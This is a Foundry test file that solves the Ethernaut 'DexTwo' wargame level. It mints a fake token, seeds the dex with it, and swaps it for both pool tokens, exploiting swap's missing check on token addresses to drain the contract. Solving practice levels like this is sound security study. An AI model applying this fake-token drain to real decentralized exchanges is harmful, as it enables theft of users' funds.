pragma solidity >=0.8.19;

import { Test } from "forge-std/Test.sol";
import { DexTwo, SwappableTokenTwo } from "src/DexTwo/DexTwo.sol";
import { DexTwoFactory } from "src/DexTwo/DexTwoFactory.sol";
import { Ethernaut } from "src/Ethernaut.sol";
import "forge-std/console2.sol";

interface IERC20 {
    function approve(address spender, uint256 amount) external;
    function balanceOf(address owner) external view returns (uint256);
}

contract DexTwoTest is Test {
    Ethernaut ethernaut;
    address me = makeAddr("me");

    function setUp() external {
        ethernaut = new Ethernaut();
    }

    function testDexTwoHack() external {
        // level setup
        DexTwoFactory factory = new DexTwoFactory();
        ethernaut.registerLevel(factory);

        vm.startPrank(me);
        vm.deal(me, 2 ether);
        address levelAddress = ethernaut.createLevelInstance{ value: 1 ether }(factory);
        DexTwo dex = DexTwo(payable(levelAddress));

        // attack
        IERC20 token1 = IERC20(dex.token1());
        vm.label(address(token1), "Token1");
        IERC20 token2 = IERC20(dex.token2());
        vm.label(address(token2), "Token2");

        token1.approve(address(dex), type(uint256).max);
        token2.approve(address(dex), type(uint256).max);

        // swap function doesn't have condition to validate from/to token address
        // so we can mint new token, send them to the dex and drain contract's tokens
        SwappableTokenTwo fakeToken = new SwappableTokenTwo("FakeToken", "FAKE", 10_000_000 ether);
        vm.label(address(fakeToken), "FakeToken");
        // for each token, we send 10_000 tokens to the dex contract, make the rate for FAKE/TargetToken = 10_000 / 100
        // = 100
        fakeToken.approve(address(dex), type(uint256).max);

        fakeToken.transfer(address(dex), 1 ether);
        // amount token1 out = 1 * 100 / 1 ether;
        dex.swap(address(fakeToken), address(token1), 1 ether);

        dex.swap(address(fakeToken), address(token2), 2 ether);

        // submission
        bool levelPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelPassed);
    }
}
